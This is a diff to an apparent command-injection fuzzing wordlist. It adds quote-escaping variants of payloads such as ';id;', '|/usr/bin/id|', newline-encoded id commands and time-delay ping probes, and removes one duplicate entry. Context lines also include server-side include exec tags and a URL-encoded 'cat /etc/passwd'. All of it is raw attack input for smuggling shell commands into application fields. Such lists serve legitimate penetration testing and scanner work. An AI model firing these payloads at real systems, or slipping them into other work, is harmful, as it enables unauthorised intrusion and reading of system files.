@@ -3,19 +3,28 @@
 &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
 &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
 /index.html|id|
+";id;"
+';id;'
 ;id;
 ;id
 ;netstat -a;
-;id;
+"|id|"
+'|id|'
 |id
 |/usr/bin/id
 |id|
+"|/usr/bin/id|"
+'|/usr/bin/id|'
 |/usr/bin/id|
+"||/usr/bin/id|"
+'||/usr/bin/id|'
 ||/usr/bin/id|
 |id;
 ||/usr/bin/id;
 ;id|
 ;|/usr/bin/id|
+"\n/bin/ls -al\n"
+'\n/bin/ls -al\n'
 \n/bin/ls -al\n
 \n/usr/bin/id\n
 \nid\n
@@ -56,8 +65,12 @@ a|/usr/bin/id
 %0Acat%20/etc/passwd
 %0A/usr/bin/id
 %0Aid
+%22%0A/usr/bin/id%0A%22
+%27%0A/usr/bin/id%0A%27
 %0A/usr/bin/id%0A
 %0Aid%0A
+"& ping -i 30 127.0.0.1 &"
+'& ping -i 30 127.0.0.1 &'
 & ping -i 30 127.0.0.1 &
 & ping -n 30 127.0.0.1 &
 %0a ping -i 30 127.0.0.1 %0a
